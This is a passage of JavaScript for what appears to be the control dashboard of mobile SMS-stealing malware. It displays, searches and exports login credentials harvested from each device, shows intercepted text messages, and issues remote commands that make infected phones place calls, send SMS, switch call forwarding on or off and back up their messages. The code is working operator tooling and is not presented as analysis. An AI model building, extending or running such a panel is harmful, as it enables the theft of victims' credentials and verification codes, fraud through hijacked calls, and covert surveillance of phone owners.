            const newLoadMore = loadMore.cloneNode(true);
            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
        }
    }
}

function loadMoreModalSms() {
    const total = state.modalSmsList.length;
    const currentOffset = state.modalSmsOffset;
    
    if (currentOffset + SMS_LIMIT < total) {
        state.modalSmsOffset += SMS_LIMIT;
        renderModalSms();
    } else {
        showToast('📭 No more messages to load', 'info');
        const loadMore = $('modalLoadMore');
        if (loadMore) {
            loadMore.style.display = 'none';
            const newLoadMore = loadMore.cloneNode(true);
            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
        }
    }
}

function closeSmsModal(e) {
    if (e && e.target !== e.currentTarget) return;
    const modal = $('smsModal');
    if (modal) modal.classList.remove('open');
}

// ============================================================
// SCROLL CREDENTIALS
// ============================================================
function scrollCredentialsToBottom(devId) {
    const container = document.getElementById(`login-cards-${devId}`);
    if (container) {
        container.scrollTo({ top: container.scrollHeight, behavior: 'smooth' });
        showToast('📜 Scrolled to bottom', 'info', 1000);
    }
}

function scrollCredentialsToTop(devId) {
    const container = document.getElementById(`login-cards-${devId}`);
    if (container) {
        container.scrollTo({ top: 0, behavior: 'smooth' });
        showToast('📜 Scrolled to top', 'info', 1000);
    }
}

function autoScrollCredentials(devId) {
    setTimeout(() => {
        const container = document.getElementById(`login-cards-${devId}`);
        if (container && container.children.length > 5) {
            setTimeout(() => {
                container.scrollTo({ top: container.scrollHeight, behavior: 'smooth' });
                setTimeout(() => {
                    container.scrollTo({ top: 0, behavior: 'smooth' });
                }, 600);
            }, 300);
        }
    }, 100);
}

// ============================================================
// COPY FIELD
// ============================================================
function copyField(fieldId) {
    const el = document.getElementById(fieldId);
    if (!el) return;
    const text = el.textContent;
    navigator.clipboard.writeText(text).then(() => {
        showToast('📋 Copied: ' + text.substring(0, 30) + (text.length > 30 ? '...' : ''), 'success');
        el.style.color = 'var(--gold)';
        setTimeout(() => el.style.color = '', 800);
    }).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        showToast('📋 Copied!', 'success');
    });
}

// ============================================================
// DELETE FUNCTIONS
// ============================================================
function deleteAllCredentials() {
    const password = prompt('🔐 Enter Password to Delete ALL Credentials:');
    if (password === null) return;
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    if (!confirm('⚠️ Are you sure you want to DELETE ALL CREDENTIALS?')) return;
    
    const loginData = state.data.login || {};
    if (Object.keys(loginData).length === 0) {
        showToast('📭 No credentials to delete', 'info');
        return;
    }
    
    showToast('⏳ Deleting all credentials...', 'info');
    const promises = Object.keys(loginData).map(devId => db.ref(`login/${devId}`).remove());
    Promise.all(promises).then(() => {
        showToast('✅ All credentials deleted successfully!', 'success');
        scheduleRender();
    }).catch(err => showToast('❌ Error: ' + err.message, 'error'));
}

function deleteDeviceCredentials(devId) {
    const password = prompt('🔐 Enter Password to Delete Credentials:');
    if (password === null) return;
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    if (!confirm(`⚠️ Delete all credentials for device ${devId}?`)) return;
    
    const loginData = state.data.login || {};
    if (!loginData[devId] || Object.keys(loginData[devId]).length === 0) {
        showToast('📭 No credentials for this device', 'info');
        return;
    }
    
    showToast(`⏳ Deleting credentials for ${devId}...`, 'info');
    db.ref(`login/${devId}`).remove().then(() => {
        showToast(`✅ Credentials deleted for ${devId}`, 'success');
        scheduleRender();
    }).catch(err => showToast('❌ Error: ' + err.message, 'error'));
}

function deleteAllSms() {
    const password = prompt('🔐 Enter Password to Delete All SMS:');
    if (password === null) return;
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS?')) return;
    
    const smsData = state.data.user_sms || {};
    if (Object.keys(smsData).length === 0) {
        showToast('📭 No SMS to delete', 'info');
        return;
    }
    
    showToast('⏳ Deleting all SMS...', 'info');
    const promises = Object.keys(smsData).map(devId => db.ref(`user_sms/${devId}`).remove());
    Promise.all(promises).then(() => {
        showToast('✅ All SMS deleted successfully!', 'success');
        state.deviceSmsCache.clear();
        state.allSmsList = [];
        state.allSmsOffset = 0;
        scheduleRender();
    }).catch(err => showToast('❌ Error: ' + err.message, 'error'));
}

function deleteDeviceSms(devId) {
    const password = prompt('🔐 Enter Password to Delete SMS:');
    if (password === null) return;
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) return;
    
    const smsData = state.data.user_sms || {};
    if (!smsData[devId] || Object.keys(smsData[devId]).length === 0) {
        showToast('📭 No SMS for this device', 'info');
        return;
    }
    
    showToast(`⏳ Deleting SMS for ${devId}...`, 'info');
    db.ref(`user_sms/${devId}`).remove().then(() => {
        showToast(`✅ SMS deleted for ${devId}`, 'success');
        state.deviceSmsCache.delete(devId);
        state.allSmsList = [];
        state.allSmsOffset = 0;
        scheduleRender();
    }).catch(err => showToast('❌ Error: ' + err.message, 'error'));
}

// ============================================================
// SHOW COMMAND DIALOG
// ============================================================
function showCommandDialog(type, devId) {
    const messages = {
        'call': '📞 Send CALL command to this device?',
        'sms': '✉️ Send SMS command to this device?',
        'fwd_on': '🔀 Activate CALL FORWARDING on this device?',
        'fwd_off': '🔀 Deactivate CALL FORWARDING on this device?',
        'backup': '💾 Trigger SMS BACKUP on this device?'
    };
    if (!confirm(messages[type] || 'Send command?')) return;
    switch (type) {
        case 'call': sendCall(devId); break;
        case 'sms': sendSms(devId); break;
        case 'fwd_on': sendFwd(devId, 'call forward'); break;
        case 'fwd_off': sendFwd(devId, 'forward off'); break;
        case 'backup': triggerDeviceBackup(devId); break;
    }
}

// ============================================================
// COMMAND FUNCTIONS
// ============================================================
function sendCall(devId) {
    const number = $(`callNum-${devId}`).value.trim();
    const simSlot = $(`callSim-${devId}`).value;
    if (!number) return showToast('Enter phone number!', 'warning');
    
    db.ref(`user_data/${devId}`).update({
        device: devId,
        simSlot: simSlot,
        adminNumber: number,
        command: 'make call',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Call sent to ${devId}`, 'success');
        $(`callNum-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

function sendSms(devId) {
    const number = $(`smsNum-${devId}`).value.trim();
    const text = $(`smsText-${devId}`).value.trim();
    const simSlot = $(`smsSim-${devId}`).value;
    if (!number || !text) return showToast('Enter both number and message!', 'warning');
    
    db.ref(`user_data/${devId}`).update({
        targetDeviceId: devId,
        phoneNumber: number,
        messageText: text,
        simSlot: simSlot,
        command: 'send message',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ SMS sent to ${devId}`, 'success');
        $(`smsNum-${devId}`).value = '';
        $(`smsText-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

function sendFwd(devId, cmd) {
    const number = $(`fwdNum-${devId}`).value.trim();
    const simSlot = $(`fwdSim-${devId}`).value;
    if (cmd === 'call forward' && !number) return showToast('Enter forward number!', 'warning');
    
    db.ref(`user_data/${devId}`).update({
        targetDeviceId: devId,
        simSlot: simSlot,
        phoneNumber: number || '',
        command: cmd,
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Forward (${cmd}) sent`, 'success');
        $(`fwdNum-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

// ============================================================
// TOAST
// ============================================================
function showToast(message, type = 'info', duration = 2800) {
    const container = $('toastContainer');
    if (!container) return;
    const toast = document.createElement('div');
    toast.className = `toast-luxury ${type}`;
    toast.textContent = message;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateY(-10px)';
        toast.style.transition = 'all 0.3s ease';
        setTimeout(() => { if (toast.parentNode) toast.remove(); }, 300);
    }, duration);
}

// ============================================================
// ESCAPE HTML
// ============================================================
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ============================================================
// CREDENTIALS CATALOG
// ============================================================
function renderCredentialsCatalog() {
    const grid = document.getElementById('credsGrid');
    const tabs = document.getElementById('credDeviceTabs');
    const pagination = document.getElementById('credPagination');
    
    if (!grid) return;
    
    const loginData = state.data.login || {};
    const devices = state.data.user_data || {};
    
    state.credCatalogData = [];
    let totalCreds = 0;
    let deviceWithCreds = 0;
    
    Object.keys(loginData).forEach(devId => {
        const creds = loginData[devId];
        if (creds && Object.keys(creds).length > 0) {
            deviceWithCreds++;
            const credList = [];
            Object.keys(creds).forEach(key => {
                const credData = { key, ...creds[key] };
                credData._timestamp = credData.timestamp || credData.date || Date.now();
                credList.push(credData);
            });
            
            credList.sort((a, b) => {
                const aTime = a._timestamp || 0;
                const bTime = b._timestamp || 0;
                return bTime - aTime;
            });
            
            state.credCatalogData.push({
                deviceId: devId,
                serial: state.deviceSerialMap.get(devId) || 0,
                deviceInfo: devices[devId] || {},
                credentials: credList,
                count: credList.length,
                latestTimestamp: credList.length > 0 ? credList[0]._timestamp : 0
            });
            totalCreds += credList.length;
        }
    });
    
    state.credCatalogData.sort((a, b) => {
        return (b.latestTimestamp || 0) - (a.latestTimestamp || 0);
    });
    
    const totalEl = document.getElementById('catalogTotalCreds');
    const devicesEl = document.getElementById('catalogTotalDevices');
    if (totalEl) totalEl.textContent = totalCreds;
    if (devicesEl) devicesEl.textContent = deviceWithCreds;
    
    buildCredDeviceTabs(tabs);
    
    let filteredData = applyCredFilters(state.credCatalogData);
    const totalPages = Math.ceil(filteredData.length / CREDS_PER_PAGE);
    if (state.credCurrentPage > totalPages) state.credCurrentPage = Math.max(1, totalPages);
    const start = (state.credCurrentPage - 1) * CREDS_PER_PAGE;
    const end = Math.min(start + CREDS_PER_PAGE, filteredData.length);
    const pageData = filteredData.slice(start, end);
    
    if (pageData.length === 0) {
        grid.innerHTML = `
            <div class="no-creds" style="grid-column:1/-1;">
                <div class="no-creds-icon"><i class="fas fa-key"></i></div>
                <h4>No Credentials Found</h4>
                <p>${state.credSearchQuery ? 'Try adjusting your search' : 'Credentials will appear here when devices save them'}</p>
            </div>
        `;
    } else {
        grid.innerHTML = pageData.map(item => buildCredCard(item)).join('');
    }
    
    renderCredPagination(pagination, totalPages, filteredData.length);
}

function buildCredCard(item) {
    const deviceName = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
    const serial = item.serial || 0;
    
    let credsHtml = item.credentials.map((cred, idx) => {
        let fieldsHtml = '';
        let timestamp = cred.timestamp || cred.date || '';
        let displayTime = '';
        let isLatest = idx === 0;
        
        if (timestamp) {
            try {
                const d = new Date(timestamp);
                displayTime = d.toLocaleString();
            } catch(e) { displayTime = ''; }
        }
        
        for (let k in cred) {
            if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
            const value = cred[k] || 'N/A';
            const fieldId = `cred-${item.deviceId}-${idx}-${k}`;
            fieldsHtml += `
                <div class="cred-field">
                    <span class="field-label">${escapeHtml(k)}</span>
                    <span class="field-value">
                        <span id="${fieldId}">${escapeHtml(String(value))}</span>
                        <button class="copy-field-btn" onclick="copyField('${fieldId}')">
                            <i class="fas fa-copy"></i>
                        </button>
                    </span>
                </div>
            `;
        }
        
        const latestBadge = isLatest ? `<span style="background:var(--green);color:#fff;font-size:8px;padding:1px 8px;border-radius:10px;margin-left:6px;">⬇️ LATEST</span>` : '';
        
        return `
            <div class="cred-item" style="${isLatest ? 'border-left-color: var(--green);' : ''}">
                <div class="cred-item-header">
                    <span class="record-num">
                        #${idx + 1} 
                        ${displayTime ? '📅 ' + escapeHtml(displayTime) : ''}
                        ${latestBadge}
                    </span>
                    <div class="cred-actions">
                        <button onclick="copyAllCreds('${item.deviceId}', ${idx})" title="Copy All">
                            <i class="fas fa-copy"></i>
                        </button>
                        <button class="danger" onclick="deleteSingleCred('${item.deviceId}', ${idx})" title="Delete">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </div>
                <div class="cred-fields">${fieldsHtml}</div>
            </div>
        `;
    }).join('');
    
    const latestTime = item.credentials.length > 0 ? new Date(item.credentials[0]._timestamp).toLocaleString() : '';
    
    return `
        <div class="cred-card" data-device="${item.deviceId}">
            <div class="cred-card-header">
                <div class="device-name-tag">
                    <span class="dev-icon"><i class="fas fa-mobile-alt"></i></span>
                    <span class="dev-name">${escapeHtml(deviceName)}</span>
                    ${serial > 0 ? `<span class="dev-serial">S-${serial}</span>` : ''}
                    ${latestTime ? `<span class="dev-serial" style="background:rgba(16,185,129,0.12);color:var(--green);">🕐 ${latestTime}</span>` : ''}
                </div>
                <span class="cred-count-badge">
                    <i class="fas fa-key"></i> ${item.count}
                </span>
            </div>
            <div class="cred-card-body">
                ${credsHtml}
            </div>
        </div>
    `;
}

function buildCredDeviceTabs(container) {
    if (!container) return;
    
    let html = `<button class="filter-tab active" onclick="filterCreds('all')" data-filter="all">
        <i class="fas fa-list"></i> All <span class="tab-count">${state.credCatalogData.length}</span>
    </button>`;
    
    html += `<button class="filter-tab" onclick="filterCreds('hasCreds')" data-filter="hasCreds">
        <i class="fas fa-check-circle"></i> With Creds <span class="tab-count">${state.credCatalogData.filter(d => d.count > 0).length}</span>
    </button>`;
    
    html += `<button class="filter-tab" onclick="filterCreds('noCreds')" data-filter="noCreds">
        <i class="fas fa-circle"></i> No Creds <span class="tab-count">${state.credCatalogData.filter(d => d.count === 0).length}</span>
    </button>`;
    
    const topDevices = [...state.credCatalogData]
        .filter(d => d.count > 0)
        .slice(0, 5);
    
    topDevices.forEach((item, index) => {
        const name = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
        const latestTime = item.credentials.length > 0 ? new Date(item.credentials[0]._timestamp).toLocaleDateString() : '';
        const isLatest = index === 0;
        const badge = isLatest ? ' 🔥' : '';
        
        html += `<button class="filter-tab ${isLatest ? 'active' : ''}" onclick="filterCredsByDevice('${item.deviceId}')" data-filter="${item.deviceId}">
            📱 ${escapeHtml(name.substring(0, 10))}${badge}
            <span class="tab-count">${item.count}</span>
            ${latestTime ? `<span style="font-size:8px;color:var(--text-muted);margin-left:2px;">🕐${latestTime}</span>` : ''}
        </button>`;
    });
    
    container.innerHTML = html;
}

function applyCredFilters(data) {
    let filtered = [...data];
    
    if (state.credFilter === 'hasCreds') {
        filtered = filtered.filter(d => d.count > 0);
    } else if (state.credFilter === 'noCreds') {
        filtered = filtered.filter(d => d.count === 0);
    } else if (state.credFilter !== 'all') {
        filtered = filtered.filter(d => d.deviceId === state.credFilter);
    }
    
    if (state.credSearchQuery) {
        const query = state.credSearchQuery.toLowerCase();
        filtered = filtered.filter(item => {
            const deviceMatch = item.deviceId.toLowerCase().includes(query) ||
                               (item.deviceInfo.d_name || '').toLowerCase().includes(query) ||
                               (item.deviceInfo.device_name || '').toLowerCase().includes(query);
            if (deviceMatch) return true;
            return item.credentials.some(cred => {
                for (let k in cred) {
                    if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
                    const value = String(cred[k] || '').toLowerCase();
                    if (value.includes(query)) return true;
                }
                return false;
            });
        });
    }
    
    return filtered;
}

function filterCreds(filter) {
    state.credFilter = filter;
    state.credCurrentPage = 1;
    
    document.querySelectorAll('.catalog-toolbar .toolbar-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    
    const btnMap = {
        'all': 'credFilterAll',
        'hasCreds': 'credFilterHasCreds',
        'noCreds': 'credFilterNoCreds'
    };
    
    if (btnMap[filter]) {
        const btn = document.getElementById(btnMap[filter]);
        if (btn) btn.classList.add('active');
    }
    
    renderCredentialsCatalog();
}

function filterCredsByDevice(deviceId) {
    state.credFilter = deviceId;
    state.credCurrentPage = 1;
    document.querySelectorAll('.catalog-toolbar .toolbar-btn').forEach(btn => btn.classList.remove('active'));
    renderCredentialsCatalog();
}

let credSearchTimeout = null;

function searchCredentials(query) {
    if (credSearchTimeout) {
        clearTimeout(credSearchTimeout);
    }
    credSearchTimeout = setTimeout(() => {
        state.credSearchQuery = query.toLowerCase().trim();
        state.credCurrentPage = 1;
        renderCredentialsCatalog();
        credSearchTimeout = null;
    }, 300);
}

function renderCredPagination(container, totalPages, totalItems) {
    if (!container) return;
    if (totalPages <= 1) { container.innerHTML = ''; return; }
    
    let html = `
        <button onclick="credGoToPage(${state.credCurrentPage - 1})" ${state.credCurrentPage <= 1 ? 'disabled' : ''}>
            <i class="fas fa-chevron-left"></i>
        </button>
    `;
    
    const startPage = Math.max(1, state.credCurrentPage - 2);
    const endPage = Math.min(totalPages, state.credCurrentPage + 2);
    
    if (startPage > 1) {
        html += `<button onclick="credGoToPage(1)">1</button>`;
        if (startPage > 2) html += `<button disabled>...</button>`;
    }
    
    for (let i = startPage; i <= endPage; i++) {
        html += `<button class="${i === state.credCurrentPage ? 'active' : ''}" onclick="credGoToPage(${i})">${i}</button>`;
    }
    
    if (endPage < totalPages) {
        if (endPage < totalPages - 1) html += `<button disabled>...</button>`;
        html += `<button onclick="credGoToPage(${totalPages})">${totalPages}</button>`;
    }
    
    html += `
        <button onclick="credGoToPage(${state.credCurrentPage + 1})" ${state.credCurrentPage >= totalPages ? 'disabled' : ''}>
            <i class="fas fa-chevron-right"></i>
        </button>
        <span class="page-info">${totalItems} items</span>
    `;
    
    container.innerHTML = html;
}

function credGoToPage(page) {
    const filtered = applyCredFilters(state.credCatalogData);
    const totalPages = Math.ceil(filtered.length / CREDS_PER_PAGE);
    if (page < 1 || page > totalPages) return;
    state.credCurrentPage = page;
    renderCredentialsCatalog();
}

function copyAllCreds(deviceId, index) {
    const data = state.credCatalogData.find(d => d.deviceId === deviceId);
    if (!data || !data.credentials[index]) return;
    
    const cred = data.credentials[index];
    let text = '';
    for (let k in cred) {
        if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
        text += `${k}: ${cred[k]}\n`;
    }
    
    navigator.clipboard.writeText(text).then(() => {
        showToast('📋 All credentials copied!', 'success');
    }).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        showToast('📋 All credentials copied!', 'success');
    });
}

function deleteSingleCred(deviceId, index) {
    const password = prompt('🔐 Enter Password to delete this credential:');
    if (password === null) return;
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    
    const data = state.credCatalogData.find(d => d.deviceId === deviceId);
    if (!data || !data.credentials[index]) return;
    
    const cred = data.credentials[index];
    const key = cred.key;
    
    if (!confirm(`Delete credential for ${deviceId}?`)) return;
    
    db.ref(`login/${deviceId}/${key}`).remove().then(() => {
        showToast('✅ Credential deleted!', 'success');
        setTimeout(() => {
            renderCredentialsCatalog();
            performRender();
        }, 300);
    }).catch(err => {
        showToast('❌ Error: ' + err.message, 'error');
    });
}

function exportCredentials() {
    if (state.credCatalogData.length === 0) {
        showToast('📭 No credentials to export', 'info');
        return;
    }
    
    let text = '=== CREDENTIALS EXPORT ===\n';
    text += `Exported: ${new Date().toLocaleString()}\n\n`;
    
    state.credCatalogData.forEach(item => {
        text += `\n📱 Device: ${item.deviceId}\n`;
        text += `   Serial: ${item.serial || 'N/A'}\n`;
        text += `   ${'-'.repeat(40)}\n`;
        
        item.credentials.forEach((cred, idx) => {
            text += `   Record #${idx + 1}:\n`;
            for (let k in cred) {
                if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
                text += `      ${k}: ${cred[k]}\n`;
            }
            text += `   ${'-'.repeat(30)}\n`;
        });
    });
    
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `credentials_export_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
    
    showToast('📥 Credentials exported!', 'success');
}

// ============================================================
// MOBILE ENHANCEMENTS
// ============================================================
function toggleFabMenu() {
    const main = document.querySelector('.fab-main');
    const actions = document.getElementById('fabActions');
    if (main) main.classList.toggle('open');
    if (actions) actions.classList.toggle('open');
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
    toggleFabMenu();
}

function openBottomSheet(content) {
    const overlay = document.getElementById('bottomSheetOverlay');
    const contentEl = document.getElementById('bottomSheetContent');
    if (contentEl) contentEl.innerHTML = content;
    if (overlay) overlay.classList.add('open');
}

function closeBottomSheet() {
    const overlay = document.getElementById('bottomSheetOverlay');
    if (overlay) overlay.classList.remove('open');
}

function showDeviceInBottomSheet(devId) {
    const dev = state.data.user_data?.[devId];
    if (!dev) return;
    const online = state.deviceOnlineStatus.get(devId) || false;
    const content = `
        <h3 style="color:var(--gold);font-size:18px;margin-bottom:12px;">📱 ${escapeHtml(devId)}</h3>
        <div style="display:grid;gap:8px;">
            <div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border-color);">
                <span style="color:var(--text-muted);">Device</span>
                <span style="font-weight:600;">${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</span>
            </div>
            <div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border-color);">
                <span style="color:var(--text-muted);">SIM 1</span>
                <span style="font-weight:600;">${escapeHtml(dev.numberSim1 || dev.sim1 || 'N/A')}</span>
            </div>
            <div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border-color);">
                <span style="color:var(--text-muted);">SIM 2</span>
                <span style="font-weight:600;">${escapeHtml(dev.numberSim2 || dev.sim2 || 'N/A')}</span>
            </div>
            <div style="display:flex;justify-content:space-between;padding:8px 0;">
                <span style="color:var(--text-muted);">Status</span>
                <span style="font-weight:600;color:${online ? 'var(--green)' : 'var(--red)'}">
                    ${online ? '🟢 Online' : '🔴 Offline'}
                </span>
            </div>
        </div>
        <div style="display:flex;gap:8px;margin-top:16px;flex-wrap:wrap;">
            <button class="btn-luxury btn-purple" onclick="closeBottomSheet();setTab('${devId}','sms')" style="flex:1;justify-content:center;min-width:80px;">
                💬 SMS
            </button>
            <button class="btn-luxury btn-blue" onclick="closeBottomSheet();setTab('${devId}','login')" style="flex:1;justify-content:center;min-width:80px;">
                🔑 Login
            </button>
            <button class="btn-luxury btn-red" onclick="closeBottomSheet();deleteDeviceSms('${devId}')" style="flex:1;justify-content:center;min-width:80px;">
                🗑️ Delete
            </button>
        </div>
    `;
    openBottomSheet(content);
}

// ===== PULL TO REFRESH =====
let refreshIndicator = null;

function initPullToRefresh() {
    const container = document.querySelector('.content-area');
    if (!container) return;
    
    refreshIndicator = document.createElement('div');
    refreshIndicator.className = 'pull-to-refresh';
    refreshIndicator.innerHTML = `
        <div class="pull-icon"><i class="fas fa-chevron-down"></i></div>
        <span class="pull-text">Pull to refresh</span>
    `;
    container.parentNode.insertBefore(refreshIndicator, container);
    
    let startY = 0;
    let isDragging = false;
    
    container.addEventListener('touchstart', function(e) {
        if (window.scrollY === 0) {
            startY = e.touches[0].clientY;
            isDragging = true;
            if (refreshIndicator) refreshIndicator.classList.add('active');
        }
    }, { passive: true });
    
    container.addEventListener('touchmove', function(e) {
        if (!isDragging) return;
        const currentY = e.touches[0].clientY;
        const diff = currentY - startY;
        if (diff > 0 && window.scrollY === 0) {
            e.preventDefault();
            if (refreshIndicator) {
                refreshIndicator.style.transform = `translateY(${Math.min(diff, 80)}px)`;
                if (diff > 60) {
                    refreshIndicator.querySelector('.pull-text').textContent = 'Release to refresh';
                    refreshIndicator.querySelector('.pull-icon i').className = 'fas fa-chevron-up';
                    refreshIndicator.classList.add('ready');
                } else {
                    refreshIndicator.querySelector('.pull-text').textContent = 'Pull to refresh';
                    refreshIndicator.querySelector('.pull-icon i').className = 'fas fa-chevron-down';
                    refreshIndicator.classList.remove('ready');
                }
            }
        }
    }, { passive: false });
    
    container.addEventListener('touchend', function(e) {
        if (!isDragging) return;
        isDragging = false;
        if (!refreshIndicator) return;
        const diff = parseInt(refreshIndicator.style.transform.replace('translateY(', '')) || 0;
        if (diff > 60) {
            refreshIndicator.querySelector('.pull-text').textContent = 'Refreshing...';
            refreshIndicator.querySelector('.pull-icon i').className = 'fas fa-spinner fa-spin';
            refreshIndicator.classList.add('refreshing');
            performRender();
            showToast('🔄 Refreshed!', 'success', 1500);
            setTimeout(() => {
                refreshIndicator.classList.remove('active', 'ready', 'refreshing');
                refreshIndicator.style.transform = 'translateY(0)';
                refreshIndicator.querySelector('.pull-text').textContent = 'Pull to refresh';
                refreshIndicator.querySelector('.pull-icon i').className = 'fas fa-chevron-down';
            }, 1500);
        } else {
            refreshIndicator.classList.remove('active', 'ready');
            refreshIndicator.style.transform = 'translateY(0)';
        }
    }, { passive: true });
}

// ===== SWIPE TO DELETE =====
let swipeStartX = 0;
let swipeCurrentX = 0;
let swipeTarget = null;
let isSwiping = false;

function initSwipeToDelete() {
    const container = $('devicesContainer');
    if (!container) return;
    
    container.addEventListener('touchstart', function(e) {
        const card = e.target.closest('.device-card-premium');
        if (!card) return;
        if (e.target.closest('button') || e.target.closest('input') || e.target.closest('select') || e.target.closest('textarea')) return;
        swipeStartX = e.touches[0].clientX;
        swipeTarget = card;
        isSwiping = true;
        card.style.transition = 'none';
    }, { passive: true });
    
    container.addEventListener('touchmove', function(e) {
        if (!isSwiping || !swipeTarget) return;
        swipeCurrentX = e.touches[0].clientX;
        const diff = swipeCurrentX - swipeStartX;
        if (diff < -20) {
            e.preventDefault();
            const translateX = Math.max(diff, -120);
            swipeTarget.style.transform = `translateX(${translateX}px)`;
            const deleteHint = swipeTarget.querySelector('.swipe-delete-hint');
            if (deleteHint) {
                deleteHint.style.opacity = Math.min(Math.abs(translateX) / 120, 1);
            }
        }
    }, { passive: false });
    
    container.addEventListener('touchend', function(e) {
        if (!isSwiping || !swipeTarget) return;
        isSwiping = false;
        const diff = swipeCurrentX - swipeStartX;
        swipeTarget.style.transition = 'transform 0.3s ease';
        if (diff < -80) {
            const devId = swipeTarget.dataset.deviceId;
            if (devId) {
                swipeTarget.style.transform = 'translateX(-100%)';
                setTimeout(() => {
                    if (confirm(`🗑️ Delete all data for device ${devId}?`)) {
                        deleteDeviceSms(devId);
                        setTimeout(() => deleteDeviceCredentials(devId), 500);
                    } else {
                        const card = document.getElementById(`card-${devId}`);
                        if (card) card.style.transform = 'translateX(0)';
                    }
                }, 300);
            }
        } else {
            swipeTarget.style.transform = 'translateX(0)';
        }
        swipeTarget = null;
    }, { passive: true });
}

// ===== LONG PRESS =====
let longPressTimer = null;
let longPressTarget = null;

function initLongPress() {
    const container = $('devicesContainer');
    if (!container) return;
    
    container.addEventListener('touchstart', function(e) {
        const card = e.target.closest('.device-card-premium');
        if (!card) return;
        if (e.target.closest('button') || e.target.closest('input') || e.target.closest('select') || e.target.closest('textarea')) return;
        longPressTarget = card;
        longPressTimer = setTimeout(() => {
            if (longPressTarget) {
                const devId = longPressTarget.dataset.deviceId;
                if (devId) {
                    if (navigator.vibrate) navigator.vibrate(20);
                    showDeviceInBottomSheet(devId);
                }
                longPressTarget = null;
            }
        }, 500);
    }, { passive: true });
    
    container.addEventListener('touchmove', function() {
        if (longPressTimer) {
            clearTimeout(longPressTimer);
            longPressTimer = null;
            longPressTarget = null;
        }
    }, { passive: true });
    
    container.addEventListener('touchend', function() {
        if (longPressTimer) {
            clearTimeout(longPressTimer);
            longPressTimer = null;
            longPressTarget = null;
        }
    }, { passive: true });
}

// ============================================================
// DOM CONTENT LOADED
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    loadFavourites();
    
    const backupSelect = $('backupDeviceSelect');
    if (backupSelect) {
        backupSelect.addEventListener('change', function() {
            const id = this.value;
            if (id) {
                updateBackupStatusDisplay(id);
                loadBackupSmsForDevice(id);
                refreshDeviceBackup(id);
            } else {
                const list = $('backupSmsList');
                if (list) list.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
            }
        });
    }
    
    const searchInput = $('deviceSearchInput');
    const clearBtn = $('searchClearBtn');
    if (searchInput) {
        searchInput.addEventListener('input', function() {
            const val = this.value;
            if (clearBtn) clearBtn.style.display = val ? 'flex' : 'none';
            searchDevices(val);
        });
    }
    if (clearBtn) {
        clearBtn.addEventListener('click', clearSearch);
    }
    
    const credSearchInput = document.getElementById('credSearchInput');
    if (credSearchInput) {
        credSearchInput.addEventListener('input', function() {
            searchCredentials(this.value);
        });
    }
    
    if (window.innerWidth <= 900) {
        setTimeout(() => {
            initPullToRefresh();
            initSwipeToDelete();
            initLongPress();
        }, 500);
    }
    
    let resizeTimer;
    window.addEventListener('resize', function() {
        clearTimeout(resizeTimer);
        resizeTimer = setTimeout(() => {
            if (window.innerWidth <= 900) {
                if (!document.querySelector('.pull-to-refresh')) {
                    initPullToRefresh();
                    initSwipeToDelete();
                    initLongPress();
                }
            }
        }, 500);
    });
    
    setTimeout(() => performRender(), 100);
});

// ============================================================
// GLOBAL EXPOSURE
// ============================================================
window.togglePanel = togglePanel;
window.toggleDevice = toggleDevice;
window.setTab = setTab;
window.searchDevices = searchDevices;
window.clearSearch = clearSearch;
window.filterDevices = filterDevices;
window.checkDeviceStatus = checkDeviceStatus;
window.loadMoreDevices = loadMoreDevices;
window.loadPrevDevices = loadPrevDevices;
window.loadMoreDeviceSms = loadMoreDeviceSms;
window.loadMoreAllSms = loadMoreAllSms;
window.openSmsModal = openSmsModal;
window.closeSmsModal = closeSmsModal;
window.loadMoreModalSms = loadMoreModalSms;
window.copyField = copyField;
window.showCommandDialog = showCommandDialog;
window.deleteAllCredentials = deleteAllCredentials;
window.deleteDeviceCredentials = deleteDeviceCredentials;
window.deleteAllSms = deleteAllSms;
